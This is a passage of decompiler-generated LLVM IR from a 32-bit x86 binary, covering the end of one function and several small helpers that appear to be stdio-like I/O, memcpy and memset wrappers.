  store i32 20, i32* %v2_8051260, align 4
  %v0_8051267 = load i32, i32* @edx, align 4
  %v1_8051267 = add i32 %v0_8051267, 28
  %v2_8051267 = inttoptr i32 %v1_8051267 to i32*
  store i32 0, i32* %v2_8051267, align 4
  br label %dec_label_pc_805126e

dec_label_pc_805126e:                             ; preds = %dec_label_pc_8051212, %dec_label_pc_8051260
  %tmp92 = icmp slt i32 %stack_var_-88.3, 1
  br i1 %tmp92, label %dec_label_pc_8051302, label %dec_label_pc_8051279

dec_label_pc_8051279:                             ; preds = %dec_label_pc_805126e
  store i32 0, i32* %ebp.global-to-local, align 4
  %v3_80512ba = add i32 %tmp76, 40
  %v1_80512f3 = add i32 %tmp76, 28
  %v2_80512f3 = inttoptr i32 %v1_80512f3 to i32*
  %v4_8051288 = add i32 %tmp76, 36
  br label %dec_label_pc_805127b

dec_label_pc_805127b:                             ; preds = %dec_label_pc_80512ee, %dec_label_pc_8051279
  %v0_8051291 = phi i32 [ 0, %dec_label_pc_8051279 ], [ %v1_80512f2, %dec_label_pc_80512ee ]
  %stack_var_-88.4 = phi i32 [ %stack_var_-88.3, %dec_label_pc_8051279 ], [ %stack_var_-88.5, %dec_label_pc_80512ee ]
  %v1_805127b = add i32 %v0_8051291, -2
  %v6_805127b = sub i32 1, %v0_8051291
  %v7_805127b = and i32 %v6_805127b, %v0_8051291
  %v8_805127b = icmp slt i32 %v7_805127b, 0
  %v9_805127b = icmp eq i32 %v1_805127b, 0
  %v10_805127b = icmp slt i32 %v1_805127b, 0
  %v3_805127e = icmp eq i1 %v10_805127b, %v8_805127b
  %v4_805127e = icmp eq i1 %v9_805127b, false
  %v5_805127e = and i1 %v4_805127e, %v3_805127e
  br i1 %v5_805127e, label %dec_label_pc_8051291, label %dec_label_pc_8051280

dec_label_pc_8051280:                             ; preds = %dec_label_pc_805127b
  store i32 %tmp76, i32* @edx, align 4
  %v0_8051284 = load i32, i32* @esp, align 4
  %v2_8051284 = mul i32 %v0_8051291, 4
  %v3_8051284 = add i32 %v2_8051284, 68
  %v4_8051284 = add i32 %v3_8051284, %v0_8051284
  %v5_8051284 = inttoptr i32 %v4_8051284 to i32*
  %v6_8051284 = load i32, i32* %v5_8051284, align 4
  store i32 %v6_8051284, i32* %eax.global-to-local, align 4
  %v1_8051288 = trunc i32 %v6_8051284 to i8
  %v5_8051288 = add i32 %v4_8051288, %v0_8051291
  %v6_8051288 = inttoptr i32 %v5_8051288 to i8*
  store i8 %v1_8051288, i8* %v6_8051288, align 1
  %v0_805128c = load i32, i32* %eax.global-to-local, align 4
  %v1_805128c = urem i32 %v0_805128c, 256
  br label %dec_label_pc_805129a

dec_label_pc_8051291:                             ; preds = %dec_label_pc_805127b
  %v5_8051293 = add i32 %v0_8051291, %stack_var_-32.3
  store i32 %v5_8051293, i32* %eax.global-to-local, align 4
  %v1_8051297 = add i32 %v5_8051293, -2
  br label %dec_label_pc_805129a

dec_label_pc_805129a:                             ; preds = %dec_label_pc_8051280, %dec_label_pc_8051291
  %v0_80512ad = phi i32 [ %v1_805128c, %dec_label_pc_8051280 ], [ %v1_8051297, %dec_label_pc_8051291 ]
  store i32 %v0_80512ad, i32* %eax.global-to-local, align 4
  %v5_805129a = sub i32 %v0_80512ad, %stack_var_-88.4
  %v11_805129a = xor i32 %v0_80512ad, %stack_var_-88.4
  %v12_805129a = xor i32 %v5_805129a, %v0_80512ad
  %v13_805129a = and i32 %v12_805129a, %v11_805129a
  %v14_805129a = icmp slt i32 %v13_805129a, 0
  %v15_805129a = icmp eq i32 %v5_805129a, 0
  %v16_805129a = icmp slt i32 %v5_805129a, 0
  %v3_805129e = icmp ne i1 %v16_805129a, %v14_805129a
  %v4_805129e = or i1 %v15_805129a, %v3_805129e
  br i1 %v4_805129e, label %dec_label_pc_80512ad, label %dec_label_pc_80512a0

dec_label_pc_80512a0:                             ; preds = %dec_label_pc_805129a
  %v1_80512a0 = add i32 %v0_80512ad, -9
  %v6_80512a0 = sub i32 8, %v0_80512ad
  %v7_80512a0 = and i32 %v6_80512a0, %v0_80512ad
  %v8_80512a0 = icmp slt i32 %v7_80512a0, 0
  %v9_80512a0 = icmp eq i32 %v1_80512a0, 0
  %v10_80512a0 = icmp slt i32 %v1_80512a0, 0
  %v3_80512a3 = icmp eq i1 %v10_80512a0, %v8_80512a0
  %v4_80512a3 = icmp eq i1 %v9_80512a0, false
  %v5_80512a3 = and i1 %v4_80512a3, %v3_80512a3
  br i1 %v5_80512a3, label %dec_label_pc_8051363, label %dec_label_pc_80512ad

dec_label_pc_80512ad:                             ; preds = %dec_label_pc_80512a0, %dec_label_pc_805129a
  %stack_var_-88.5 = phi i32 [ %stack_var_-88.4, %dec_label_pc_805129a ], [ %v0_80512ad, %dec_label_pc_80512a0 ]
  %v1_80512ad = add i32 %v0_80512ad, -1
  store i32 %v1_80512ad, i32* %eax.global-to-local, align 4
  store i32 %tmp76, i32* @edx, align 4
  %v0_80512b6 = load i32, i32* @esp, align 4
  %v1_80512b6 = load i32, i32* %ebp.global-to-local, align 4
  %v2_80512b6 = mul i32 %v1_80512b6, 4
  %v3_80512b6 = add i32 %v0_80512b6, 80
  %v4_80512b6 = add i32 %v3_80512b6, %v2_80512b6
  %v5_80512b6 = inttoptr i32 %v4_80512b6 to i32*
  %v6_80512b6 = load i32, i32* %v5_80512b6, align 4
  store i32 %v6_80512b6, i32* %edi.global-to-local, align 4
  %v2_80512ba = mul i32 %v1_80512ad, 4
  %v4_80512ba = add i32 %v3_80512ba, %v2_80512ba
  %v5_80512ba = inttoptr i32 %v4_80512ba to i32*
  %v6_80512ba = load i32, i32* %v5_80512ba, align 4
  store i32 %v6_80512ba, i32* @eax, align 4
  %v9_80512be = icmp eq i32 %v6_80512b6, 8
  br i1 %v9_80512be, label %dec_label_pc_80512ee, label %dec_label_pc_80512c3

dec_label_pc_80512c3:                             ; preds = %dec_label_pc_80512ad
  %v9_80512c3 = icmp eq i32 %v6_80512ba, 8
  br i1 %v9_80512c3, label %dec_label_pc_80512de, label %dec_label_pc_80512c8

dec_label_pc_80512c8:                             ; preds = %dec_label_pc_80512c3
  %v12_80512c8 = icmp eq i32 %v6_80512ba, %v6_80512b6
  br i1 %v12_80512c8, label %dec_label_pc_80512de, label %dec_label_pc_80512cc

dec_label_pc_80512cc:                             ; preds = %dec_label_pc_80512c8
  %v1_80512cc = call i32 @function_8050f7c(i32 %v1_80512ad)
  store i32 %v1_80512cc, i32* %ebx.global-to-local, align 4
  %v0_80512d3 = load i32, i32* %edi.global-to-local, align 4
  store i32 %v0_80512d3, i32* @eax, align 4
  %v1_80512d5 = call i32 @function_8050f7c(i32 %v1_80512ad)
  store i32 %v1_80512d5, i32* %eax.global-to-local, align 4
  %v8_80512dc = icmp sgt i32 %v1_80512cc, %v1_80512d5
  br i1 %v8_80512dc, label %dec_label_pc_80512ee, label %dec_label_pc_80512cc.dec_label_pc_80512de_crit_edge

dec_label_pc_80512cc.dec_label_pc_80512de_crit_edge: ; preds = %dec_label_pc_80512cc
  %v0_80512e6.pre = load i32, i32* @esp, align 4
  %v1_80512e6.pre = load i32, i32* %ebp.global-to-local, align 4
  br label %dec_label_pc_80512de

dec_label_pc_80512de:                             ; preds = %dec_label_pc_80512cc.dec_label_pc_80512de_crit_edge, %dec_label_pc_80512c8, %dec_label_pc_80512c3
  %v1_80512e6 = phi i32 [ %v1_80512e6.pre, %dec_label_pc_80512cc.dec_label_pc_80512de_crit_edge ], [ %v1_80512b6, %dec_label_pc_80512c8 ], [ %v1_80512b6, %dec_label_pc_80512c3 ]
  %v0_80512e6 = phi i32 [ %v0_80512e6.pre, %dec_label_pc_80512cc.dec_label_pc_80512de_crit_edge ], [ %v0_80512b6, %dec_label_pc_80512c8 ], [ %v0_80512b6, %dec_label_pc_80512c3 ]
  store i32 %v1_80512ad, i32* %ecx.global-to-local, align 4
  store i32 %tmp76, i32* @edx, align 4
  %v2_80512e6 = mul i32 %v1_80512e6, 4
  %v3_80512e6 = add i32 %v0_80512e6, 80
  %v4_80512e6 = add i32 %v3_80512e6, %v2_80512e6
  %v5_80512e6 = inttoptr i32 %v4_80512e6 to i32*
  %v6_80512e6 = load i32, i32* %v5_80512e6, align 4
  store i32 %v6_80512e6, i32* %eax.global-to-local, align 4
  store i32 %v6_80512e6, i32* %v5_80512ba, align 4
  br label %dec_label_pc_80512ee

dec_label_pc_80512ee:                             ; preds = %dec_label_pc_80512cc, %dec_label_pc_80512ad, %dec_label_pc_80512de
  store i32 %tmp76, i32* @ecx, align 4
  %v0_80512f2 = load i32, i32* %ebp.global-to-local, align 4
  %v1_80512f2 = add i32 %v0_80512f2, 1
  store i32 %v1_80512f2, i32* %ebp.global-to-local, align 4
  %v3_80512f3 = load i32, i32* %v2_80512f3, align 4
  %v1_80512f6 = add i32 %v3_80512f3, 2
  store i32 %v1_80512f6, i32* %eax.global-to-local, align 4
  %v5_80512fb = icmp slt i32 %v1_80512f2, %v1_80512f6
  br i1 %v5_80512fb, label %dec_label_pc_805127b, label %dec_label_pc_8051329

dec_label_pc_8051302:                             ; preds = %dec_label_pc_805126e
  store i32 %tmp76, i32* %eax.global-to-local, align 4
  %v1_8051306 = add i32 %tmp76, 38
  %v2_8051306 = inttoptr i32 %v1_8051306 to i8*
  store i8 1, i8* %v2_8051306, align 1
  store i32 %tmp76, i32* %edx.global-to-local, align 4
  %v1_805130f = add i32 %tmp76, 28
  %v2_805130f = inttoptr i32 %v1_805130f to i32*
  %v3_805130f = load i32, i32* %v2_805130f, align 4
  %v2_8051312 = mul i32 %v3_805130f, 4
  %v2_8051316 = ptrtoint i32* %stack_var_-20 to i32
  %v1_805131d = add i32 %tmp76, 40
  store i32 %v1_805131d, i32* %eax.global-to-local, align 4
  %v3_8051321 = inttoptr i32 %v1_805131d to i16*
  %v4_8051321 = call i32 @function_8051414(i16* %v3_8051321, i32 %v2_8051316, i32 %v2_8051312)
  store i32 %v4_8051321, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8051329

dec_label_pc_8051329:                             ; preds = %dec_label_pc_80512ee, %dec_label_pc_8051302
  %stack_var_-88.6 = phi i32 [ %stack_var_-88.3, %dec_label_pc_8051302 ], [ %stack_var_-88.5, %dec_label_pc_80512ee ]
  store i32 %tmp76, i32* @ecx, align 4
  store i32 %stack_var_-88.6, i32* %eax.global-to-local, align 4
  store i32 %stack_var_-88.6, i32* %v2_8050fd4, align 4
  %v0_8051334 = load i32, i32* @ecx, align 4
  %v1_8051334 = add i32 %v0_8051334, 16
  %v2_8051334 = inttoptr i32 %v1_8051334 to i8*
  %v3_8051334 = load i8, i8* %v2_8051334, align 1
  %v5_8051334 = icmp slt i8 %v3_8051334, 0
  br i1 %v5_8051334, label %dec_label_pc_8051341, label %dec_label_pc_805133a

dec_label_pc_805133a:                             ; preds = %dec_label_pc_8051329
  %v0_805133a = load i32, i32* @esi, align 4
  %v1_805133a = add i32 %v0_805133a, 1
  store i32 %v1_805133a, i32* %eax.global-to-local, align 4
  %v2_805133d = inttoptr i32 %v0_8051334 to i32*
  store i32 %v1_805133a, i32* %v2_805133d, align 4
  br label %dec_label_pc_8051354

dec_label_pc_8051341:                             ; preds = %dec_label_pc_8051329
  store i32 %v4_8050fa8, i32* %edx.global-to-local, align 4
  store i32 %tmp76, i32* @ecx, align 4
  %v0_8051349 = load i32, i32* @esi, align 4
  %v2_8051349 = sub i32 %v0_8051349, %v4_8050fa8
  store i32 %v2_8051349, i32* %esi.global-to-local, align 4
  %v1_805134b = mul i32 %v2_8051349, 4
  %v2_805134b = add i32 %v1_805134b, 224
  store i32 %v2_805134b, i32* %eax.global-to-local, align 4
  %v2_8051352 = load i32, i32* %arg1, align 4
  %v4_8051352 = add i32 %v2_8051352, %v2_805134b
  store i32 %v4_8051352, i32* %arg1, align 4
  br label %dec_label_pc_8051354

dec_label_pc_8051354:                             ; preds = %dec_label_pc_805133a, %dec_label_pc_8051341
  store i32 %tmp76, i32* @edx, align 4
  %v1_8051358 = add i32 %tmp76, 28
  %v2_8051358 = inttoptr i32 %v1_8051358 to i32*
  %v3_8051358 = load i32, i32* %v2_8051358, align 4
  store i32 %v3_8051358, i32* %eax.global-to-local, align 4
  %v1_805135b = add i32 %v3_8051358, 2
  br label %dec_label_pc_8051363

dec_label_pc_8051363:                             ; preds = %dec_label_pc_8050ff9, %dec_label_pc_8051093, %dec_label_pc_8051124, %dec_label_pc_805112d, %dec_label_pc_8051141, %dec_label_pc_80510c6, %dec_label_pc_80512a0, %dec_label_pc_80511a3, %dec_label_pc_8051257, %dec_label_pc_8051354
  %storemerge6 = phi i32 [ %v1_805135b, %dec_label_pc_8051354 ], [ -1, %dec_label_pc_8051257 ], [ -1, %dec_label_pc_80511a3 ], [ -1, %dec_label_pc_80512a0 ], [ -1, %dec_label_pc_80510c6 ], [ -1, %dec_label_pc_8051141 ], [ -1, %dec_label_pc_805112d ], [ -1, %dec_label_pc_8051124 ], [ -1, %dec_label_pc_8051093 ], [ -1, %dec_label_pc_8050ff9 ]
  store i32 %storemerge6, i32* %eax.global-to-local, align 4
  %v2_8051366 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_8051366, i32* @ebx, align 4
  store i32 %v0_8050fa7, i32* @esi, align 4
  store i32 %v0_8050fa6, i32* @edi, align 4
  ret i32 %storemerge6

; uselistorder directives
  uselistorder i32 %stack_var_-88.6, { 1, 0 }
  uselistorder i32 %v1_80512f2, { 0, 2, 1 }
  uselistorder i32 %v1_80512ad, { 3, 2, 1, 0, 4 }
  uselistorder i32 %v1_80512a0, { 1, 0 }
  uselistorder i32 %v5_805129a, { 1, 2, 0 }
  uselistorder i32 %v0_80512ad, { 4, 3, 0, 6, 5, 1, 2, 7, 8 }
  uselistorder i32 %v1_805127b, { 1, 0 }
  uselistorder i32 %stack_var_-88.4, { 1, 0, 2 }
  uselistorder i32 %v0_8051291, { 0, 1, 3, 2, 5, 4 }
  uselistorder i32 %v1_805120c, { 1, 2, 0 }
  uselistorder i32 %v1_80511e2, { 1, 2, 0 }
  uselistorder i32 %v0_805120c, { 2, 0, 1, 3 }
  uselistorder i32 %v2_80511a7, { 1, 0 }
  uselistorder i32 %v1_8051196, { 0, 1, 4, 3, 2 }
  uselistorder i32 %v0_805119f, { 0, 1, 2, 3, 6, 5, 4 }
  uselistorder i32 %v1_8051189, { 0, 2, 3, 1 }
  uselistorder i32 %v6_805117f, { 1, 0 }
  uselistorder i32 %v1_8051161, { 1, 0 }
  uselistorder i32 %v0_805117f.pre.pre, { 0, 3, 1, 2 }
  uselistorder i32 %stack_var_-88.3, { 3, 2, 1, 4, 0 }
  uselistorder i32 %stack_var_-32.3, { 1, 0 }
  uselistorder i32 %v1_8051144, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v0_805113b, { 1, 2, 0 }
  uselistorder i32 %v0_8051101, { 1, 0 }
  uselistorder i32 %v1_80510ee, { 1, 0 }
  uselistorder i32 %v6_80510ec, { 2, 0, 1 }
  uselistorder i32 %v2_80510fd, { 0, 2, 1 }
  uselistorder i32 %v1_80510f3, { 1, 0 }
  uselistorder i8* %v1_80510ef, { 1, 0 }
  uselistorder i32 %v6_80510ec145, { 1, 0, 2 }
  uselistorder i32 %v0_805110e, { 0, 2, 4, 3, 1 }
  uselistorder i32 %v2_80510a9, { 1, 2, 0 }
  uselistorder i32 %v0_8051081, { 0, 1, 2, 6, 3, 4, 5, 7 }
  uselistorder i32 %v0_8051074.lcssa, { 0, 1, 2, 4, 3 }
  uselistorder i32 %v1_805106d.lcssa, { 0, 1, 2, 3, 5, 8, 7, 4, 6 }
  uselistorder i32 %v2_8051077, { 1, 2, 0 }
  uselistorder i32 %v6_8051075, { 0, 2, 1 }
  uselistorder i32 %v1_8051074, { 0, 2, 3, 1 }
  uselistorder i32 %v3_805106d, { 2, 1, 0 }
  uselistorder i32 %v1_8051065, { 1, 0 }
  uselistorder i32 %v1_805106d137, { 0, 3, 4, 1, 2 }
  uselistorder i32 %v0_805105d, { 1, 0, 2 }
  uselistorder i32 %stack_var_-88.1, { 0, 1, 3, 4, 2, 6, 5, 7 }
  uselistorder i32 %v0_8051050, { 0, 1, 3, 2, 4 }
  uselistorder i32 %v8_805104b, { 1, 0, 3, 2 }
  uselistorder i32 %v1_8051021, { 0, 2, 1 }
  uselistorder i32 %v2_8051010, { 1, 0 }
  uselistorder i32 %v0_805100e, { 2, 0, 1 }
  uselistorder i32 %v4_8050fa8, { 1, 0 }
  uselistorder i32* %stack_var_-16, { 0, 2, 1 }
  uselistorder i32* %stack_var_-20, { 2, 0, 1 }
  uselistorder i32 %tmp76, { 24, 23, 22, 21, 1, 20, 19, 18, 17, 16, 15, 14, 13, 0, 2, 3, 4, 12, 11, 10, 9, 8, 7, 6, 5 }
  uselistorder i32* %edx.global-to-local, { 0, 1, 2, 3, 5, 4, 6, 7, 8 }
  uselistorder i32* %edi.global-to-local, { 0, 1, 4, 2, 5, 3, 6, 7 }
  uselistorder i32* %ebp.global-to-local, { 2, 3, 5, 4, 6, 0, 1, 7 }
  uselistorder i32* %eax.global-to-local, { 3, 2, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 17, 14, 15, 16, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 36, 32, 31, 33, 34, 1, 37, 35, 0, 43, 38, 39, 40, 41, 42, 44, 45 }
  uselistorder i32 (i32)* @function_8050f7c, { 1, 0 }
  uselistorder i32 -5, { 1, 0 }
  uselistorder i32 -134592043, { 1, 0 }
  uselistorder i32 ptrtoint ([21 x i8]* @global_var_805b635.317 to i32), { 1, 0, 2 }
  uselistorder i8 109, { 1, 0 }
  uselistorder i32* %arg1, { 0, 1, 3, 2, 4 }
  uselistorder label %dec_label_pc_8051363, { 9, 6, 8, 7, 4, 3, 2, 5, 1, 0 }
  uselistorder label %dec_label_pc_8051354, { 1, 0 }
  uselistorder label %dec_label_pc_8051329, { 1, 0 }
  uselistorder label %dec_label_pc_80512ee, { 2, 0, 1 }
  uselistorder label %dec_label_pc_805129a, { 1, 0 }
  uselistorder label %dec_label_pc_805126e, { 1, 0 }
  uselistorder label %dec_label_pc_80511d6, { 2, 1, 0 }
  uselistorder label %dec_label_pc_80511a3, { 2, 0, 1 }
  uselistorder label %dec_label_pc_805117a, { 1, 0 }
  uselistorder label %dec_label_pc_8051151, { 1, 0 }
  uselistorder label %dec_label_pc_8051118, { 1, 0, 3, 2 }
  uselistorder label %dec_label_pc_80510f8, { 1, 0 }
  uselistorder label %dec_label_pc_80510bb, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8051074, { 1, 0 }
  uselistorder label %dec_label_pc_8051065, { 1, 0 }
  uselistorder label %dec_label_pc_805105b, { 1, 0 }
  uselistorder label %dec_label_pc_8051044, { 1, 0 }
  uselistorder label %dec_label_pc_8051044.outer, { 2, 0, 1 }
}

define i32 @function_805136c() local_unnamed_addr {
dec_label_pc_805136c:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp2 = call i32 @__decompiler_undefined_function_0()
  %v0_805136c = load i32, i32* @esi, align 4
  %v0_805136d = load i32, i32* @ebx, align 4
  store i32 %tmp2, i32* @ebx, align 4
  %v1_8051376 = inttoptr i32 %tmp2 to i8*
  %v2_8051376 = call i32 @function_80514b0(i8* %v1_8051376)
  store i32 %v2_8051376, i32* @esi, align 4
  %v0_8051387 = load i32, i32* @ebx, align 4
  %v5_8051388 = call i32 @function_80513a0(i32 %v0_8051387, i64 1, i32 %v2_8051376, i32 %tmp)
  %v1_8051393 = load i32, i32* @esi, align 4
  %v12_8051393 = icmp eq i32 %v5_8051388, %v1_8051393
  %v1_8051395 = icmp eq i1 %v12_8051393, false
  br i1 %v1_8051395, label %dec_label_pc_8051399, label %dec_label_pc_8051397

dec_label_pc_8051397:                             ; preds = %dec_label_pc_805136c
  br label %dec_label_pc_8051399

dec_label_pc_8051399:                             ; preds = %dec_label_pc_805136c, %dec_label_pc_8051397
  %v0_8051399 = phi i32 [ -1, %dec_label_pc_805136c ], [ %v5_8051388, %dec_label_pc_8051397 ]
  store i32 %v0_805136d, i32* @ebx, align 4
  store i32 %v0_805136c, i32* @esi, align 4
  ret i32 %v0_8051399

; uselistorder directives
  uselistorder i32 %v5_8051388, { 1, 0 }
  uselistorder i32 %tmp2, { 1, 0 }
  uselistorder label %dec_label_pc_8051399, { 1, 0 }
}

define i32 @function_80513a0(i32 %arg1, i64 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_80513a0:
  %stack_var_-28 = alloca i32, align 4
  %v0_80513a0 = load i32, i32* @edi, align 4
  %v0_80513a1 = load i32, i32* @esi, align 4
  store i32 %arg4, i32* @ebx, align 4
  %v4_80513a7 = trunc i64 %arg2 to i32
  store i32 %v4_80513a7, i32* @esi, align 4
  store i32 %arg3, i32* @edi, align 4
  %v1_80513af = inttoptr i32 %arg4 to i16*
  %v2_80513af = load i16, i16* %v1_80513af, align 2
  %v1_80513b2 = and i16 %v2_80513af, 192
  %v6_80513b7 = icmp eq i16 %v1_80513b2, 192
  br i1 %v6_80513b7, label %dec_label_pc_80513d2, label %dec_label_pc_80513be

dec_label_pc_80513be:                             ; preds = %dec_label_pc_80513a0
  %v0_80513be = load i32, i32* @edx, align 4
  store i32 %arg4, i32* %stack_var_-28, align 4
  %v6_80513c6 = call i32 @function_8053dfc(i16* %v1_80513af, i32 128, i32 %v0_80513be, i32 %v0_80513be)
  %v1_80513ce = icmp eq i32 %v6_80513c6, 0
  %v1_80513d0 = icmp eq i1 %v1_80513ce, false
  br i1 %v1_80513d0, label %dec_label_pc_805140e, label %dec_label_pc_80513d2

dec_label_pc_80513d2:                             ; preds = %dec_label_pc_80513be, %dec_label_pc_80513a0
  %v2_80513d2 = icmp eq i32 %v4_80513a7, 0
  br i1 %v2_80513d2, label %dec_label_pc_805140e, label %dec_label_pc_80513d6

dec_label_pc_80513d6:                             ; preds = %dec_label_pc_80513d2
  %v1_80513d6 = icmp eq i32 %arg3, 0
  br i1 %v1_80513d6, label %dec_label_pc_805140e, label %dec_label_pc_80513da

dec_label_pc_80513da:                             ; preds = %dec_label_pc_80513d6
  %v9_80513df = udiv i64 4294967295, %arg2
  %v10_80513df = trunc i64 %v9_80513df to i32
  %v6_80513e3 = icmp ult i32 %v10_80513df, %arg3
  br i1 %v6_80513e3, label %dec_label_pc_80513ff, label %dec_label_pc_80513e5

dec_label_pc_80513e5:                             ; preds = %dec_label_pc_80513da
  %sext = mul i64 %arg2, 4294967296
  %v2_80513e8 = sdiv i64 %sext, 4294967296
  %v3_80513e8 = sext i32 %arg3 to i64
  %v4_80513e8 = mul nsw i64 %v3_80513e8, %v2_80513e8
  %v5_80513e8 = trunc i64 %v4_80513e8 to i32
  %v0_80513eb = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* %stack_var_-28, align 4
  %v5_80513f1 = call i32 @function_8053d0c(i32 %arg1, i32 %v5_80513e8, i32 %v0_80513eb, i32 %v10_80513df)
  %v6_80513f1 = sext i32 %v5_80513f1 to i64
  %v10_80513f8 = udiv i64 %v6_80513f1, %arg2
  %v11_80513f8 = trunc i64 %v10_80513f8 to i32
  br label %dec_label_pc_8051410

dec_label_pc_80513ff:                             ; preds = %dec_label_pc_80513da
  %v0_80513ff = load i32, i32* @ebx, align 4
  %v1_80513ff = inttoptr i32 %v0_80513ff to i16*
  %v2_80513ff = load i16, i16* %v1_80513ff, align 2
  %v3_80513ff = or i16 %v2_80513ff, 8
  store i16 %v3_80513ff, i16* %v1_80513ff, align 2
  %v0_8051403 = load i32, i32* %stack_var_-28, align 4
  %v1_8051403 = call i32 @function_8050568(i32 %v0_8051403)
  %v1_8051408 = inttoptr i32 %v1_8051403 to i32*
  store i32 22, i32* %v1_8051408, align 4
  br label %dec_label_pc_805140e

dec_label_pc_805140e:                             ; preds = %dec_label_pc_80513d6, %dec_label_pc_80513d2, %dec_label_pc_80513be, %dec_label_pc_80513ff
  br label %dec_label_pc_8051410

dec_label_pc_8051410:                             ; preds = %dec_label_pc_80513e5, %dec_label_pc_805140e
  %v0_8051413 = phi i32 [ %v11_80513f8, %dec_label_pc_80513e5 ], [ 0, %dec_label_pc_805140e ]
  store i32 %v0_80513a1, i32* @esi, align 4
  store i32 %v0_80513a0, i32* @edi, align 4
  ret i32 %v0_8051413

; uselistorder directives
  uselistorder i32 %v0_80513be, { 1, 0 }
  uselistorder i32 (i32, i32, i32, i32)* @function_8053d0c, { 6, 5, 4, 2, 1, 7, 3, 0 }
  uselistorder i32 %arg3, { 1, 0, 2, 3 }
  uselistorder i64 %arg2, { 2, 0, 1, 3 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8051410, { 1, 0 }
  uselistorder label %dec_label_pc_805140e, { 3, 0, 1, 2 }
}

define i32 @function_8051414(i16* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_8051414:
  %eax.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_8051415 = load i32, i32* @esi, align 4
  store i32 %v0_8051415, i32* %stack_var_-8, align 4
  %sext = mul i32 %arg3, 16777216
  %v4_8051416 = sdiv i32 %sext, 16777216
  store i32 %v4_8051416, i32* %eax.global-to-local, align 4
  store i32 %arg2, i32* %esi.global-to-local, align 4
  %v4_8051420 = ptrtoint i16* %arg1 to i32
  store i32 %v4_8051420, i32* %edi.global-to-local, align 4
  %v2_8051424 = udiv i32 %v4_8051416, 4
  %v3_8051427 = inttoptr i32 %arg2 to i8*
  %v4_8051427 = bitcast i16* %arg1 to i8*
  %v5_8051427 = call i8* @_memcpy(i8* %v4_8051427, i8* %v3_8051427, i32 %v2_8051424)
  %v6_8051427 = ptrtoint i8* %v5_8051427 to i32
  store i32 %v6_8051427, i32* @ecx, align 4
  %v0_8051429 = load i32, i32* %eax.global-to-local, align 4
  %v2_8051429 = and i32 %v0_8051429, 2
  %v3_8051429 = icmp eq i32 %v2_8051429, 0
  br i1 %v3_8051429, label %dec_label_pc_805142f, label %dec_label_pc_805142d

dec_label_pc_805142d:                             ; preds = %dec_label_pc_8051414
  %v0_805142d = load i32, i32* %esi.global-to-local, align 4
  %v1_805142d = inttoptr i32 %v0_805142d to i16*
  %v2_805142d = load i16, i16* %v1_805142d, align 2
  %v3_805142d = load i32, i32* %edi.global-to-local, align 4
  %v4_805142d = inttoptr i32 %v3_805142d to i16*
  store i16 %v2_805142d, i16* %v4_805142d, align 2
  %v5_805142d = load i32, i32* %edi.global-to-local, align 4
  %v6_805142d = load i32, i32* %esi.global-to-local, align 4
  %v7_805142d = load i1, i1* @df, align 1
  %v8_805142d = select i1 %v7_805142d, i32 -2, i32 2
  %v9_805142d = add i32 %v8_805142d, %v5_805142d
  %v10_805142d = add i32 %v8_805142d, %v6_805142d
  store i32 %v9_805142d, i32* %edi.global-to-local, align 4
  store i32 %v10_805142d, i32* %esi.global-to-local, align 4
  %v0_805142f.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805142f

dec_label_pc_805142f:                             ; preds = %dec_label_pc_8051414, %dec_label_pc_805142d
  %v0_805142f = phi i32 [ %v0_8051429, %dec_label_pc_8051414 ], [ %v0_805142f.pre, %dec_label_pc_805142d ]
  %v2_805142f = urem i32 %v0_805142f, 2
  %v3_805142f = icmp eq i32 %v2_805142f, 0
  br i1 %v3_805142f, label %dec_label_pc_8051434, label %dec_label_pc_8051433

dec_label_pc_8051433:                             ; preds = %dec_label_pc_805142f
  %v0_8051433 = load i32, i32* %esi.global-to-local, align 4
  %v1_8051433 = inttoptr i32 %v0_8051433 to i8*
  %v2_8051433 = load i8, i8* %v1_8051433, align 1
  %v3_8051433 = load i32, i32* %edi.global-to-local, align 4
  %v4_8051433 = inttoptr i32 %v3_8051433 to i8*
  store i8 %v2_8051433, i8* %v4_8051433, align 1
  %v5_8051433 = load i32, i32* %edi.global-to-local, align 4
  %v6_8051433 = load i32, i32* %esi.global-to-local, align 4
  %v7_8051433 = load i1, i1* @df, align 1
  %v8_8051433 = select i1 %v7_8051433, i32 -1, i32 1
  %v9_8051433 = add i32 %v8_8051433, %v5_8051433
  %v10_8051433 = add i32 %v8_8051433, %v6_8051433
  store i32 %v9_8051433, i32* %edi.global-to-local, align 4
  store i32 %v10_8051433, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_8051434

dec_label_pc_8051434:                             ; preds = %dec_label_pc_805142f, %dec_label_pc_8051433
  store i32 %v4_8051420, i32* %eax.global-to-local, align 4
  %v2_8051438 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_8051438, i32* @esi, align 4
  ret i32 %v4_8051420

; uselistorder directives
  uselistorder i32* %esi.global-to-local, { 0, 2, 4, 1, 3, 5, 6 }
  uselistorder i32* %edi.global-to-local, { 0, 2, 3, 1, 4, 5, 6 }
  uselistorder label %dec_label_pc_8051434, { 1, 0 }
  uselistorder label %dec_label_pc_805142f, { 1, 0 }
}

define i32 @function_805143c(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_805143c:
  %v0_805143c = load i32, i32* @edi, align 4
  %v4_8051445 = ptrtoint i8* %arg1 to i32
  %v5_8051449 = call i8* @_memset(i8* %arg1, i32 %arg2, i32 %arg3)
  %v6_8051449 = ptrtoint i8* %v5_8051449 to i32
  store i32 %v6_8051449, i32* @ecx, align 4
  store i32 %v0_805143c, i32* @edi, align 4
  ret i32 %v4_8051445

; uselistorder directives
  uselistorder i8* %arg1, { 1, 0 }
}

define i32 @function_8051474(i8* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_8051474:
